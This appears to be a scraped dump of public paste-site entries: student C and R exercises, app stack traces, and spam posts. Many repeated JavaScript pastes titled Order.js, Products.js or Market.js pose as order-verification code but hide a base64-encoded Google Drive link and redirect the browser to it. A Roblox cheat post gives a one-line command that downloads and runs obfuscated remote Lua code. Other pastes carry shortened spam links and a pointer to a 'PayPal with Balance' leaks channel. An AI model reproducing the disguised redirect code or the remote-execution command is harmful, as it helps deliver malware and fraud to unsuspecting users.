  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
GmfS8V07,Products.js,kammex,JavaScript,Monday 21st of April 2025 10:03:13 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/01590/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gUVYbf2y,PayPal with Balance,Ratqueenkslskskwkw,JavaScript,Monday 21st of April 2025 09:58:52 AM CDT,Posted on https://t.me/l34ksbyemin3m
6t7r1HXy,Order.js,kammex,JavaScript,Monday 21st of April 2025 09:47:39 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/31566/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
7k2y2zXY,Market.js,kammex,JavaScript,Monday 21st of April 2025 09:32:16 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/13180/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
RgUgcS7B,matriz locales,Aluneth,C,Monday 21st of April 2025 09:26:31 AM CDT,"#include <stdio.h>
#include <stdlib.h>


void cargarLocales(char local[3][31], int semanas[4][4])
{
    int f, total;
    total = 0;
    for(f=0; f<3; f++)
    {
        printf(""Ingrese el nombre del local %d:"", f+1);
        scanf(""%s"", local[f]);
        fflush(stdin);
        for (int k = 0; k<3; k++)
        {
            printf(""Ganancias de la semana %d: "", k+1);
            scanf(""%d"", &semanas[f][k]);
            total = total + semanas[f][k];
            semanas[f][3] = total;
        }
        total = 0;
    }
}

void imprimirLocales(char local[3][31], int semanas[4][4])
{
    int f;
    printf(""Local\t"");
    for (int l = 0; l<4; l++)
    {
        printf(""S%d |\t"", l+1);
    }
    printf(""Total"");
    printf(""\n"");
    for(f=0; f<3; f++)
    {
        printf(""%s\t"", local[f]);

        for (int k = 0; k<4; k++)
        {
            printf(""%d |\t"", semanas[f][k]);
        }
        printf(""\n"");
    }
}

int main()
{
    char locales[4][31];
    int semanas[4][4];
    cargarLocales(locales, semanas);
    imprimirLocales(locales, semanas);

    return 0;
}
"
WXvMEdqH,earn to program in Python and complete 4 real projects,f0f077,Python,Monday 21st of April 2025 09:23:19 AM CDT,"Learn to program in Python and complete 4 real projects
Procedural Python | Object-Oriented Python | 4 Complete Projects | 11 Multiple Choice Questions and 41 Corrected Exercises
Learn the fundamentals of the Python language,
Learn how to use Python 3 professionally,
Understand how to create your own Python programs,
Learn Object-Oriented Programming (OOP) in Python,
for more:https://short-jambo.ink/dGFr"
P41Lwq6c,Advanced Python: Going Further,f0f077,Python,Monday 21st of April 2025 09:17:33 AM CDT,"Advanced Python: Going Further
Learn advanced programming techniques to code more efficiently with the help of numerous practical exercises.
What you will learn
Understand how Python objects work in memory, so you can optimize your code
Learn several functions that will allow you to reduce the number of lines of code you have to write
Use introspection so you can analyze your code to debug and understand it deeply
Document your code well using docstrings
for more:https://short-jambo.ink/E9uIFIw"
DhthNXmQ,Untitled,kammex,JavaScript,Monday 21st of April 2025 09:16:54 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/70590/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Vzw1Tw7T,MM2 AUTOFARM! 🔪 [EGG HUNT!],ScriptSensical,C++,Monday 21st of April 2025 09:01:51 AM CDT,"📌 [Updated for MM2 Egg Hunt 2025!]  
🗓️ Update Date: 2025-04-21 — 14:00 PM

🔪 SCRIPT USED IN VIDEO:
loadstring(game:HttpGet('https://raw.githubusercontent.com/BludnyHolandan/MM2/refs/heads/main/obf/script.lua'))()
--{By WoozieX}--

📌 What’s New:
✅ Easter Egg Hunt AutoFarm  
✅ Works on Mobile & PC  
✅ No Key Required  
✅ Silent & Stable Execution  

🛠️ LAST UPDATE: 2025-04-21

⚠️ **Notice**:
Using third-party scripts in games may violate the game's Terms of Service and could result in account action.  
Use this at your own risk — I am not responsible for any losses or bans.

⏳ **Important**:  
Wait around **5 seconds** after the game loads before executing the script — otherwise, it may crash.

💬 Join our Discord for support, updates, giveaways, and more!"
ayQ3mmGJ,Products.js,kammex,JavaScript,Monday 21st of April 2025 09:01:32 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/91507/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
M1xDNjRu,EXP10_PieChart,vvccs,R,Monday 21st of April 2025 08:51:42 AM CDT,"Download R https://mirror.niser.ac.in/cran/bin/windows/base/R-4.5.0-win.exe

#Simple Pie Chart

# Create data for the graph.
a<- c(23, 56, 20, 63)
labels <- c(""Mumbai"", ""Pune"", ""Chennai"", ""Bangalore"")
# Plot the chart.
pie(a, labels)

#############################################################################

#Pie Chart With Color

# Create data for the graph.
a<- c(23, 56, 20, 63)
labels <- c(""Mumbai"", ""Pune"", ""Chennai"", ""Bangalore"")
# Plot the chart with title and rainbow
# color pallet.
pie(a, labels, main = ""City pie chart"",
col = rainbow(length(a)))

#############################################################################

#Slice Percentage & Chart Legend

# Create data for the graph.
a<- c(23, 56, 20, 63)
labels <- c(""Mumbai"", ""Pune"", ""Chennai"", ""Bangalore"")
piepercent<- round(100 * a/ sum(a), 1)
# Plot the chart.
pie(a, labels = piepercent,
main = ""City pie chart"", col = rainbow(length(a)))
legend(""topright"", c(""Mumbai"", ""Pune"", ""Chennai"", ""Bangalore""),
cex = 0.5, fill = rainbow(length(a)))

#############################################################################

#3D Pie
#install plotrix
install.packages(""plotrix"", repos = ""https://cloud.r-project.org/"")

# Load the required library
library(plotrix)

# Create data for the graph
a<- c(23, 56, 20, 63)
cities <- c(""Mumbai"", ""Pune"", ""Chennai"", ""Bangalore"")
piepercent <- round(100 * a/ sum(a), 1)
labels <- paste(cities, piepercent, ""%"")

# Plot the chart
pie3D(a, labels = labels, main = ""City pie chart"", col = rainbow(length(a)))

# Add legend
legend(""topright"", cities, cex = 0.5, fill = rainbow(length(a)))

"
4VM1iGCp,Order.js,kammex,JavaScript,Monday 21st of April 2025 08:46:10 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/09450/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2GqUrAiu,EXP9_BarGraph,vvccs,R,Monday 21st of April 2025 08:43:57 AM CDT,"Download R https://mirror.niser.ac.in/cran/bin/windows/base/R-4.5.0-win.exe

#Simple Bar Chart
# Create the data for the chart
A <- c(17, 32, 8, 53, 1)

# Plot the bar chart
barplot(A, xlab = ""X-axis"", ylab = ""Y-axis"", main =""Bar-Chart"")

#############################################################################

#Horizontal Bar Chart
# Create the data for the chart
A <- c(17, 32, 8, 53, 1)
# Plot the bar chart
barplot(A, horiz = TRUE, xlab = ""X-axis"",
ylab = ""Y-axis"", main =""Bar-Chart"")

#############################################################################

#Adding Color and Title
# Create the data for the chart
A <- c(17, 2, 8, 13, 1, 22)
B <- c(""Jan"", ""feb"", ""Mar"", ""Apr"", ""May"", ""Jun"")
# Plot the bar chart
barplot(A, names.arg = B, xlab =""Month"",
ylab =""Articles"", col =""green"",
main =""GeeksforGeeks-Article chart"")

#############################################################################

#Creating Stacked Bar Chart

colors = c(""green"", ""orange"", ""brown"")
months <- c(""Mar"", ""Apr"", ""May"", ""Jun"", ""Jul"")
regions <- c(""East"", ""West"", ""North"")
# Create the matrix of the values.
Values <- matrix(c(2, 9, 3, 11, 9, 4, 8, 7, 3, 12, 5, 2, 8, 10, 11),
nrow = 3, ncol = 5, byrow = TRUE)
# Create the bar chart
barplot(Values, main = ""Total Revenue"", names.arg = months,
xlab = ""Month"", ylab = ""Revenue"",
col = colors, beside = TRUE)
# Add the legend to the chart
legend(""topleft"", regions, cex = 0.7, fill = colors)

#Example 2
colors = c(""green"", ""orange"", ""brown"")
months <- c(""Mar"", ""Apr"", ""May"", ""Jun"", ""Jul"")
regions <- c(""East"", ""West"", ""North"")
# Create the matrix of the values.
Values <- matrix(c(2, 9, 3, 11, 9, 4, 8, 7, 3, 12, 5, 2, 8, 10, 11),
nrow = 3, ncol = 5, byrow = TRUE)
# Create the bar chart
barplot(Values, main = ""Total Revenue"", names.arg = months,xlab = ""Month"", ylab = ""Revenue"", col = colors)
# Add the legend to the chart
legend(""topleft"", regions, cex = 0.7, fill = colors)
"
jCwHaK0D,EXP8_LineGraph,vvccs,R,Monday 21st of April 2025 08:37:38 AM CDT,"Download R https://mirror.niser.ac.in/cran/bin/windows/base/R-4.5.0-win.exe

#SingleLineGraph
# Create the data for the chart.
v <- c(17, 25, 38, 13, 41)
# Plot the bar chart.
plot(v, type = ""o"", col = ""green"",
xlab = ""Month"", ylab = ""Article Written"",
main = ""Article Written chart"")


#MultiLineGraph
# Create the data for the chart.
v <- c(17, 25, 38, 13, 41)
t <- c(22, 19, 36, 19, 23)
m <- c(25, 14, 16, 34, 29)
# Plot the bar chart.
plot(v, type = ""o"", col = ""red"",
xlab = ""Month"", ylab = ""Article Written "",
main = ""Article Written chart"")
lines(t, type = ""o"", col = ""blue"")
lines(m, type = ""o"", col = ""green"")"
syA6sjcK,2025-04-21T15:37:18.248841,powerampache,PHP,Monday 21st of April 2025 08:37:18 AM CDT,"1.01-79 (79) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.ScrobbleException: {""errorAction"":""record_play"",""errorCode"":""4701"",""errorMessage"":""Sessione scaduta"",""errorType"":""account""}
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl.scrobbleApiCall(SongsRepositoryImpl.kt:652)
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl.access$scrobbleApiCall(SongsRepositoryImpl.kt:80)
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl$scrobbleApiCall$1.invokeSuspend(Unknown Source:15)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:984)
	at android.os.Handler.dispatchMessage(Handler.java:104)
	at android.os.Looper.loopOnce(Looper.java:238)
	at android.os.Looper.loop(Looper.java:357)
	at android.app.ActivityThread.main(ActivityThread.java:8088)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:548)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:957)

scrobble() - "
Uug0SZ3u,EXP7_FundamentalR,vvccs,R,Monday 21st of April 2025 08:35:25 AM CDT,"Download R https://mirror.niser.ac.in/cran/bin/windows/base/R-4.5.0-win.exe

DataTypes:


# Scalar examples
num <- 10               # Numeric scalar
char <- ""Hello, World!"" # Character scalar
logi <- TRUE            # Logical scalar

# Display the scalars
print(num)
print(char)
print(logi)

#############################################################################

# Creating a numerical vector
num_vec <- c(1, 2, 3, 4, 5)

# Displaying the vector
print(num_vec)

# Performing arithmetic operations on a numerical vector
num_vec_sum <- sum(num_vec)
num_vec_mean <- mean(num_vec)
print(paste(""Sum: "", num_vec_sum))
print(paste(""Mean: "", num_vec_mean))

#############################################################################

# Creating a character vector
char_vec <- c(""apple"", ""banana"", ""cherry"")

# Displaying the character vector
print(char_vec)

# Concatenating elements of the character vector
char_vec_concat <- paste(char_vec, collapse = "" and "")
print(paste(""Concatenated: "", char_vec_concat))

#############################################################################

# Creating a logical vector
log_vec <- c(TRUE, FALSE, TRUE, TRUE)

# Displaying the logical vector
print(log_vec)

# Performing logical operations
log_and <- all(log_vec) # Check if all values are TRUE
log_or <- any(log_vec)  # Check if any value is TRUE
print(paste(""All TRUE? "", log_and))
print(paste(""Any TRUE? "", log_or))

#############################################################################

# Arithmetic operations on scalars
scalar_addition <- 5 + 3
scalar_subtraction <- 5 - 3
scalar_multiplication <- 5 * 3
scalar_division <- 5 / 3

# Arithmetic operations on vectors
vec_addition <- num_vec + c(1, 1, 1, 1, 1) # Adding scalar to each element
vec_multiplication <- num_vec * 2           # Multiplying each element by 2

# Display results
print(paste(""Scalar addition: "", scalar_addition))
print(paste(""Scalar subtraction: "", scalar_subtraction))
print(paste(""Scalar multiplication: "", scalar_multiplication))
print(paste(""Scalar division: "", scalar_division))
print(""Vector addition:"")
print(vec_addition)
print(""Vector multiplication:"")
print(vec_multiplication)

#############################################################################

# Logical operations on scalars
scalar_comparison <- 5 > 3         # TRUE
scalar_equal <- 5 == 3             # FALSE

# Logical operations on vectors
vec_logical_and <- num_vec > 2 & num_vec < 5  # Logical AND
vec_logical_or <- num_vec < 2 | num_vec > 4   # Logical OR
vec_logical_not <- !(num_vec == 3)            # Logical NOT

# Display results
print(paste(""Scalar comparison (5 > 3): "", scalar_comparison))
print(paste(""Scalar equality (5 == 3): "", scalar_equal))
print(""Vector logical AND:"")
print(vec_logical_and)
print(""Vector logical OR:"")
print(vec_logical_or)
print(""Vector logical NOT:"")
print(vec_logical_not)

"
EmbgdhER,Market.js,kammex,JavaScript,Monday 21st of April 2025 08:30:47 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/58156/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
UxGCXtJJ,Convert JSON to URL Query String,metalx1000,Bash,Monday 21st of April 2025 08:30:05 AM CDT,"# Convert JSON to URL Query String

info='{
  ""fname"": ""jon"",
  ""lname"": ""tower"",
  ""phone"": ""555-555-1234"",
  ""dob"": ""01/02/1984""
}'

echo ""$info""
echo $info|jq -r '[to_entries[] | (@uri ""\(.key)"" + ""="" + @uri ""\(.value)"")] | join(""&"")'
vars=""$(echo $info|jq -r '[to_entries[] | (@uri ""\(.key)"" + ""="" + @uri ""\(.value)"")] | join(""&"")')""

wget -qO- ""http://website/submit.php?${vars}""

"
SiVNsxHu,Is PHP worth learning in 2024 for web?,f0f077,PHP,Monday 21st of April 2025 08:28:50 AM CDT,"Is PHP worth learning in 2024 for web?
## Is PHP Worth Learning in 2024 for Web Development?
Is PHP still relevant in today's tech world?  The answer is a resounding yes!  PHP is still going strong and definitely worth learning.  
One of the biggest reasons for its continued popularity is WordPress.  WordPress is a powerful website platform that powers millions of websites, and it's built on PHP.  Since WordPress isn't going anywhere anytime soon, PHP will continue to be a valuable skill.  
for more:https://linkrex.net/jXZCP7M7c7"
4DqALW5s,Untitled,kammex,JavaScript,Monday 21st of April 2025 08:15:24 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/86685/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
074wJ6ZL,2025-04-21T18:11:00.569757,powerampache,PHP,Monday 21st of April 2025 08:11:01 AM CDT,"1.01-80 (80) - DB: 83
java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)

"
qSBMCexP,2025-04-21T15:01:45.191113,powerampache,PHP,Monday 21st of April 2025 08:01:45 AM CDT,"1.01-79 (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Failed to connect to /192.168.1.29:80"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1156)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:651)
	at java.lang.Thread.run(Thread.java:1119)

authorize() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""Failed to connect to /192.168.1.29:80\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""Failed to connect to /192.168.1.29:80\"" }"",""stackTrace"":[],""suppressedExceptions"":[]}"
sEJU62W3,Products.js,kammex,JavaScript,Monday 21st of April 2025 08:00:01 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/95752/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
w10UsZSr,Order.js,kammex,JavaScript,Monday 21st of April 2025 07:44:32 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/08579/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JxwaUFBd,2025-04-21T15:40:25.395754,powerampache,PHP,Monday 21st of April 2025 07:40:26 AM CDT,"1.01-79-free (79) - DB: 83
java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)

"
